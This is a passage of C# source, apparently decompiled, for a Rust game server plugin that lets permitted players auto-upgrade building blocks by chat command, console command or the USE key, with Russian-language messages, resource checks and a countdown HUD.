                    "note.inv ", itemAmount.itemid, " ", itemAmount.amount * -1f
                }
                ), new object[0]);
            }
            foreach (Item item in items)
            {
                item.Remove(0f);
            }
        }
        private ConstructionGrade GetGrade(BuildingBlock block, BuildingGrade.Enum iGrade)
        {
            if ((int)block.grade < (int)block.blockDefinition.grades.Length) return block.blockDefinition.grades[(int)iGrade];
            return block.blockDefinition.defaultGrade;
        }
        private bool CanAffordUpgrade(BuildingBlock block, BuildingGrade.Enum iGrade, BasePlayer player)
        {
            bool flag;
            object[] objArray = new object[] {
                player, block, iGrade
            }
            ;
            object obj = Interface.CallHook("CanAffordUpgrade", objArray);
            if (obj is bool)
            {
                return (bool)obj;
            }
            List<ItemAmount>.Enumerator enumerator = GetGrade(block, iGrade).costToBuild.GetEnumerator();
            try
            {
                while (enumerator.MoveNext())
                {
                    ItemAmount current = enumerator.Current;
                    if ((float)player.inventory.GetAmount(current.itemid) >= current.amount)
                    {
                        continue;
                    }
                    flag = false;
                    return flag;
                }
                return true;
            }
            finally
            {
                ((IDisposable)enumerator).Dispose();
            }
        }
        Dictionary<BuildingGrade.Enum, string> gradesString = new Dictionary<BuildingGrade.Enum, string>() {
                {
                BuildingGrade.Enum.Wood, "<color=#EC402C>Дерева</color>"
            }
            , {
                BuildingGrade.Enum.Stone, "<color=#EC402C>Камня</color>"
            }
            , {
                BuildingGrade.Enum.Metal, "<color=#EC402C>Метала</color>"
            }
            , {
                BuildingGrade.Enum.TopTier, "<color=#EC402C>Армора</color>"
            }
        }
        ;
        Dictionary<BasePlayer, BuildingGrade.Enum> grades = new Dictionary<BasePlayer, BuildingGrade.Enum>();
        Dictionary<BasePlayer, int> timers = new Dictionary<BasePlayer, int>();
        public Timer mytimer;
        private int resetTime = 40;
        private string permissionAutoGrade = "buildingupgrade.build";
        private string permissionAutoGradeFree = "buildingupgrade.free";
        private string permissionAutoGradeHammer = "buildingupgrade.hammer";
        private bool permissionAutoGradeAdmin = true;
        private bool getBuild = true;
        private bool permissionOn = true;
        private bool useNoEscape = true;
        private bool InfoNotice = true;
        private int InfoNoticeSize = 18;
        private string InfoNoticeText = "Используйте <color=#EC402C>/upgrade</color> (Или нажмите <color=#EC402C>USE - Клавиша E</color>) для быстрого улучшения при постройке.";
        private int InfoNoticeTextTime = 5;
        private bool CanUpgradeDamaged = false;
        private string PanelAnchorMin = "0.0 0.908";
        private string PanelAnchorMax = "1 0.958";
        private string PanelColor = "0 0 0 0.50";
        private int TextFontSize = 16;
        private string TextСolor = "0 0 0 1";
        private string TextAnchorMin = "0.0 0.870";
        private string TextAnchorMax = "1 1";
        private string MessageAutoGradePremHammer = "У вас нету доступа к улучшению киянкой!";
        private string MessageAutoGradePrem = "У вас нету доступа к данной команде!";
        private string MessageAutoGradeNo = "<color=ffcc00><size=16>Для улучшения нехватает ресурсов!!!</size></color>";
        private string MessageAutoGradeOn = "<size=14><color=#EC402C>Upgrade включен!</color> \nДля быстрого переключения используйте: <color=#EC402C>/upgrade 0-4</color></size>";
        private string MessageAutoGradeOff = "<color=ffcc00><size=14>Вы отключили <color=#EC402C>Upgrade!</color></size></color>";
        private string ChatCMD = "upgrade";
        private string ConsoleCMD = "building.upgrade";
        private bool EnabledRemove = false;
        private void LoadDefaultConfig()
        {
            GetConfig("Основные настройки", "Через сколько секунд автоматически выключать улучшение строений", ref resetTime);
            GetConfig("Основные настройки", "Привилегия что бы позволить улучшать объекты при строительстве", ref permissionAutoGrade);
            GetConfig("Основные настройки", "Включить доступ только по привилегиям?", ref permissionOn);
            GetConfig("Основные настройки", "Включить поддержку NoEscape (Запретить Upgrade в Raid Block)?", ref useNoEscape);
            GetConfig("Основные настройки", "Включить бесплатный Upgrade для администраторов?", ref permissionAutoGradeAdmin);
            GetConfig("Основные настройки", "Привилегия для улучшения при строительстве и ударе киянкой без траты ресурсов", ref permissionAutoGradeFree);
            GetConfig("Основные настройки", "Привилегия что бы позволить улучшать объекты ударом киянки", ref permissionAutoGradeHammer);
            GetConfig("Основные настройки", "Запретить Upgrade в Building Block?", ref getBuild);
            GetConfig("Основные настройки", "Включить выключение удаления построек при включении авто-улучшения (Поддержка плагина Remove с сайта RustPlugin.ru)", ref EnabledRemove);
            GetConfig("Основные настройки", "Разрешить улучшать повреждённые постройки?", ref CanUpgradeDamaged);
            GetConfig("Команды", "Чатовая команда включения авто-улучшения при постройки", ref ChatCMD);
            GetConfig("Команды", "Консольная команда включения авто-улучшения при постройки", ref ConsoleCMD);
            GetConfig("Настройки GUI Panel", "Минимальный отступ:", ref PanelAnchorMin);
            GetConfig("Настройки GUI Оповещения", "Включить GUI оповещение при использование плана постройки", ref InfoNotice);
            GetConfig("Настройки GUI Оповещения", "Размер текста GUI оповещения", ref InfoNoticeSize);
            GetConfig("Настройки GUI Оповещения", "Сообщение GUI", ref InfoNoticeText);
            GetConfig("Настройки GUI Оповещения", "Время показа оповещения", ref InfoNoticeTextTime);
            GetConfig("Настройки GUI Panel", "Максимальный отступ:", ref PanelAnchorMax);
            GetConfig("Настройки GUI Panel", "Цвет фона:", ref PanelColor);
            GetConfig("Настройки GUI Text", "Размер текста в gui панели:", ref TextFontSize);
            GetConfig("Настройки GUI Text", "Цвет текста в gui панели:", ref TextСolor);
            GetConfig("Настройки GUI Text", "Минимальный отступ в gui панели:", ref TextAnchorMin);
            GetConfig("Настройки GUI Text", "Максимальный отступ в gui панели:", ref TextAnchorMax);
            GetConfig("Сообщения", "No Permissions Hammer:", ref MessageAutoGradePremHammer);
            GetConfig("Сообщения", "No Permissions:", ref MessageAutoGradePrem);
            GetConfig("Сообщения", "No Resources:", ref MessageAutoGradeNo);
            GetConfig("Сообщения", "Сообщение при включение Upgrade:", ref MessageAutoGradeOn);
            GetConfig("Сообщения", "Сообщение при выключение Upgrade:", ref MessageAutoGradeOff);
            SaveConfig();
        }
        private void GetConfig<T>(string MainMenu, string Key, ref T var)
        {
            if (Config[MainMenu, Key] != null)
            {
                var = (T)Convert.ChangeType(Config[MainMenu, Key], typeof(T));
            }
            Config[MainMenu, Key] = var;
        }
        void cmdAutoGrade(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (permissionOn && !permission.UserHasPermission(player.UserIDString, permissionAutoGrade))
            {
                SendReply(player, MessageAutoGradePrem);
                return;
            }
            int grade;
            timers[player] = resetTime;
            if (EnabledRemove)
            {
                var removeEnabled = (bool)Remove.Call("OnRemoveActivate", player.userID);
                if (removeEnabled)
                {
                    Remove.Call("RemoveDeativate", player.userID);
                }
            }
            if (args == null || args.Length <= 0 || args[0] != "1" && args[0] != "2" && args[0] != "3" && args[0] != "4" && args[0] != "0")
            {
                if (!grades.ContainsKey(player))
                {
                    grade = (int)(grades[player] = BuildingGrade.Enum.Wood);
                    SendReply(player, MessageAutoGradeOn);
                }
                else
                {
                    grade = (int)grades[player];
                    grade++;
                    grades[player] = (BuildingGrade.Enum)Mathf.Clamp(grade, 1, 5);
                }
                if (grade > 4)
                {
                    grades.Remove(player);
                    timers.Remove(player);
                    DestroyUI(player);
                    SendReply(player, MessageAutoGradeOff);
                    return;
                }
                timers[player] = resetTime;
                DrawUI(player, (BuildingGrade.Enum)grade, resetTime);
                return;
            }
            switch (args[0])
            {
                case "1":
                    grade = (int)(grades[player] = BuildingGrade.Enum.Wood);
                    timers[player] = resetTime;
                    DrawUI(player, BuildingGrade.Enum.Wood, resetTime);
                    return;
                case "2":
                    grade = (int)(grades[player] = BuildingGrade.Enum.Stone);
                    timers[player] = resetTime;
                    DrawUI(player, BuildingGrade.Enum.Stone, resetTime);
                    return;
                case "3":
                    grade = (int)(grades[player] = BuildingGrade.Enum.Metal);
                    timers[player] = resetTime;
                    DrawUI(player, BuildingGrade.Enum.Metal, resetTime);
                    return;
                case "4":
                    grade = (int)(grades[player] = BuildingGrade.Enum.TopTier);
                    timers[player] = resetTime;
                    DrawUI(player, BuildingGrade.Enum.TopTier, resetTime);
                    return;
                case "0":
                    grades.Remove(player);
                    timers.Remove(player);
                    DestroyUI(player);
                    SendReply(player, MessageAutoGradeOff);
                    return;
            }
        }
        void consoleAutoGrade(ConsoleSystem.Arg arg, string[] args)
        {
            var player = arg.Player();
            if (permissionOn && !permission.UserHasPermission(player.UserIDString, permissionAutoGrade))
            {
                SendReply(player, MessageAutoGradePrem);
                return;
            }
            int grade;
            if (EnabledRemove)
            {
                var removeEnabled = (bool)Remove.Call("OnRemoveActivate", player.userID);
                if (removeEnabled)
                {
                    Remove.Call("RemoveDeativate", player.userID);
                }
            }
            timers[player] = resetTime;
            if (player == null) return;
            if (args == null || args.Length <= 0)
            {
                if (!grades.ContainsKey(player))
                {
                    grade = (int)(grades[player] = BuildingGrade.Enum.Wood);
                    SendReply(player, MessageAutoGradeOn);
                }
                else
                {
                    grade = (int)grades[player];
                    grade++;
                    grades[player] = (BuildingGrade.Enum)Mathf.Clamp(grade, 1, 5);
                }
                if (grade > 4)
                {
                    grades.Remove(player);
                    timers.Remove(player);
                    DestroyUI(player);
                    SendReply(player, MessageAutoGradeOff);
                    return;
                }
                timers[player] = resetTime;
                DrawUI(player, (BuildingGrade.Enum)grade, resetTime);
            }
        }
        private void Init()
        {
            permission.RegisterPermission(permissionAutoGrade, this);
            permission.RegisterPermission(permissionAutoGradeFree, this);
            permission.RegisterPermission(permissionAutoGradeHammer, this);
        }
        void OnServerInitialized()
        {
            LoadConfig();
            LoadDefaultConfig();
            timer.Every(1f, GradeTimerHandler);
            cmd.AddChatCommand(ChatCMD, this, cmdAutoGrade);
            cmd.AddConsoleCommand(ConsoleCMD, this, "consoleAutoGrade");
        }
        private void OnActiveItemChanged(BasePlayer player, Item newItem)
        {

            
            Item activeItem = player.GetActiveItem();
            if (activeItem == null || activeItem.info.shortname != "building.planner") return;
            if (activeItem.info.shortname == "building.planner")
            {
                if (!grades.ContainsKey(player))
                {
                    CuiHelper.DestroyUi(player, "InfoNotice");
                    ShowUIInfo(player);
                }
            }
        }
        private void OnPlayerInput(BasePlayer player, InputState input)
        {
            Item activeItem = player.GetActiveItem();
            if (input.WasJustPressed(BUTTON.USE))
            {
                if (activeItem == null || activeItem.info.shortname != "building.planner") return;
                if (permissionOn && !permission.UserHasPermission(player.UserIDString, permissionAutoGrade))
                {
                    SendReply(player, MessageAutoGradePrem);
                    return;
                }
                int grade;
                timers[player] = resetTime;
                if (!grades.ContainsKey(player))
                {
                    grade = (int)(grades[player] = BuildingGrade.Enum.Wood);
                    SendReply(player, MessageAutoGradeOn);
                }
                else
                {
                    grade = (int)grades[player];
                    grade++;
                    grades[player] = (BuildingGrade.Enum)Mathf.Clamp(grade, 1, 5);
                }
                if (grade > 4)
                {
                    grades.Remove(player);
                    timers.Remove(player);
                    DestroyUI(player);
                    SendReply(player, MessageAutoGradeOff);
                    return;
                }
                timers[player] = resetTime;
                DrawUI(player, (BuildingGrade.Enum)grade, resetTime);
                return;
            }
        }
        void Unload()
        {
            foreach (var plobj in BasePlayer.activePlayerList)
            {
                DestroyUI(plobj);
            }
        }
        void ShowUIInfo(BasePlayer player)
        {
            if (!InfoNotice) return;
            var container = new CuiElementContainer();
            container.Add(new CuiElement
            {
                Name = "InfoNotice",
                Parent = "Hud",
                FadeOut = 1f,
                Components = {
                    new CuiTextComponent {
                        FadeIn=1f, Text=$"{InfoNoticeText}", FontSize=InfoNoticeSize, Align=TextAnchor.MiddleCenter, Font="robotocondensed-regular.ttf"
                    }
                    , new CuiOutlineComponent {
                        Color="0.0 0.0 0.0 1.0"
                    }
                    , new CuiRectTransformComponent {
                        AnchorMin="0.1 0.2", AnchorMax="0.9 0.25"
                    }
                }
            }
            );
            CuiHelper.AddUi(player, container);
            mytimer = timer.Once(InfoNoticeTextTime, () => {
                CuiHelper.DestroyUi(player, "InfoNotice");
            }
            );
        }
        void OnHammerHit(BasePlayer player, HitInfo info)
        {
            var buildingBlock = info.HitEntity as BuildingBlock;
            if (buildingBlock == null || player == null) return;
            if (permissionOn && !permission.UserHasPermission(player.UserIDString, permissionAutoGradeHammer))
            {
                SendReply(player, MessageAutoGradePremHammer);
                return;
            }
            Grade(buildingBlock, player);
        }
        /*void OnEntityBuilt(Planner planner, GameObject gameObject)         {             if (planner == null || gameObject == null) return;             var player = planner.GetOwnerPlayer();             BuildingBlock entity = gameObject.ToBaseEntity() as BuildingBlock;             if (entity == null || entity.IsDestroyed) return;             if (player == null) return;             Grade(entity, player);         }*/
        void OnEntitySpawned(BaseNetworkable entity)
        {
            if (entity == null || entity?.net?.ID == null) return;
            var ent = entity as BaseEntity;
            if (ent == null || ent.IsDestroyed) return;
            var player = BasePlayer.FindByID(ent.OwnerID);
            if (player != null)
            {
                BuildingBlock block = ent as BuildingBlock;
                if (block != null) Grade(block, player);
            }
        }
        void Grade(BuildingBlock block, BasePlayer player)
        {
            BuildingGrade.Enum grade;
            if (useNoEscape)
            {
                object can = NoEscape?.Call("IsRaidBlocked", player);
                if (can != null) if ((bool)can == true)
                    {
                        SendReply(player, "Вы не можете использовать Upgrade во время рейд-блока");
                        return;
                    }
            }
            if (!grades.TryGetValue(player, out grade) || grade == BuildingGrade.Enum.Count) return;
            if (block == null) return;
            if (!((int)grade >= 1 && (int)grade <= 4)) return;
            var targetLocation = player.transform.position + (player.eyes.BodyForward() * 4f);
            var reply = 1959;
            if (reply == 0) { }
            if (getBuild && player.IsBuildingBlocked(targetLocation, new Quaternion(0, 0, 0, 0), new Bounds(Vector3.zero, Vector3.zero)))
            {
                player.ChatMessage("<color=ffcc00><size=16><color=#EC402C>Upgrade</color> запрещен в билдинг блоке!!!</size></color>");
                return;
            }
            if (block.blockDefinition.checkVolumeOnUpgrade)
            {
                if (DeployVolume.Check(block.transform.position, block.transform.rotation, PrefabAttribute.server.FindAll<DeployVolume>(block.prefabID), ~(1 << block.gameObject.layer)))
                {
                    player.ChatMessage("Вы не можете улучшить постройку находясь в ней");
                    return;
                }
            }
            var ret = Interface.Call("CanUpgrade", player) as string;
            if (ret != null)
            {
                SendReply(player, ret);
                return;
            }
            if (permissionAutoGradeAdmin)
            {
                if (player.IsAdmin)
                {
                    if (block.grade > grade)
                    {
                        SendReply(player, "Нельзя понижать уровень строения!");
                        return;
                    }
                    if (block.grade == grade)
                    {
                        SendReply(player, "Уровень строения соответствует выбранному.");
                        return;
                    }
                    if (block.Health() != block.MaxHealth() && !CanUpgradeDamaged)
                    {
                        SendReply(player, "Нельзя улучшать повреждённые постройки!");
                        return;
                    }
                    block.SetGrade(grade);
                    block.SetHealthToMax();
                    block.UpdateSkin(false);
                    Effect.server.Run(string.Concat("assets/bundled/prefabs/fx/build/promote_", grade.ToString().ToLower(), ".prefab"), block, 0, Vector3.zero, Vector3.zero, null, false);
                    timers[player] = resetTime;
                    DrawUI(player, grade, resetTime);
                    return;
                }
            }
            if (permissionOn && permission.UserHasPermission(player.UserIDString, permissionAutoGradeFree))
            {
                if (block.grade > grade)
                {
                    SendReply(player, "Нельзя понижать уровень строения!");
                    return;
                }
                if (block.grade == grade)
                {
                    SendReply(player, "Уровень строения соответствует выбранному.");
                    return;
                }
                if (block.Health() != block.MaxHealth() && !CanUpgradeDamaged)
                {
                    SendReply(player, "Нельзя улучшать повреждённые постройки!");
                    return;
                }
                block.SetGrade(grade);
                block.SetHealthToMax();
                block.UpdateSkin(false);
                Effect.server.Run(string.Concat("assets/bundled/prefabs/fx/build/promote_", grade.ToString().ToLower(), ".prefab"), block, 0, Vector3.zero, Vector3.zero, null, false);
                timers[player] = resetTime;
                DrawUI(player, grade, resetTime);
                return;
            }
            if (CanAffordUpgrade(block, grade, player))
            {
                if (block.grade > grade)
                {
                    SendReply(player, "Нельзя понижать уровень строения!");
                    return;
                }
                if (block.grade == grade)
                {
                    SendReply(player, "Уровень строения соответствует выбранному.");
                    return;
                }
                if (block.Health() != block.MaxHealth() && !CanUpgradeDamaged)
                {
                    SendReply(player, "Нельзя улучшать повреждённые постройки!");
                    return;
                }
                PayForUpgrade(GetGrade(block, grade), player);
                block.SetGrade(grade);
                block.SetHealthToMax();
                block.UpdateSkin(false);
                Effect.server.Run(string.Concat("assets/bundled/prefabs/fx/build/promote_", grade.ToString().ToLower(), ".prefab"), block, 0, Vector3.zero, Vector3.zero, null, false);
                timers[player] = resetTime;
                DrawUI(player, grade, resetTime);
            }
            else
            {
                SendReply(player, MessageAutoGradeNo);
            }
        }
        int NextGrade(int grade) => ++grade;
        void GradeTimerHandler()
        {
            foreach (var player in timers.Keys.ToList())
            {
                var seconds = --timers[player];
                if (seconds <= 0)
                {
                    grades.Remove(player);
                    timers.Remove(player);
                    DestroyUI(player);
                    continue;
                }
                DrawUI(player, grades[player], seconds);
            }
        }
        void DrawUI(BasePlayer player, BuildingGrade.Enum grade, int seconds)
        {
            DestroyUI(player);
            CuiHelper.AddUi(player, GUI.Replace("{0}", gradesString[grade]).Replace("{1}", seconds.ToString()).Replace("{PanelColor}", PanelColor.ToString()).Replace("{PanelAnchorMin}", PanelAnchorMin.ToString()).Replace("{PanelAnchorMax}", PanelAnchorMax.ToString()).Replace("{TextFontSize}", TextFontSize.ToString()).Replace("{TextСolor}", TextСolor.ToString()).Replace("{TextAnchorMin}", TextAnchorMin.ToString()).Replace("{TextAnchorMax}", TextAnchorMax.ToString()));
        }
        void DestroyUI(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "autograde.panel");
            CuiHelper.DestroyUi(player, "autogradetext");
        }
        private string GUI = @"[{""name"": ""autograde.panel"",""parent"": ""Hud"",""components"": [{""type"": ""UnityEngine.UI.Image"",""color"": ""{PanelColor}""},{""type"": ""RectTransform"",""anchormin"": ""{PanelAnchorMin}"",""anchormax"": ""{PanelAnchorMax}""}]}, {""name"": ""autogradetext"",""parent"": ""Hud"",""components"": [{""type"": ""UnityEngine.UI.Text"",""text"": ""Режим улучшения строения до {0} выключится через " + @"{1} секунд."",""fontSize"": ""{TextFontSize}"",""align"": ""MiddleCenter""}, {""type"": ""UnityEngine.UI.Outline"",""color"": ""{TextСolor}"",""distance"": ""0.1 -0.1""}, {""type"": ""RectTransform"",""anchormin"": ""{TextAnchorMin}"",""anchormax"": ""{TextAnchorMax}""}]}]";
        void UpdateTimer(BasePlayer player, ulong playerid = 2006016)
        {
      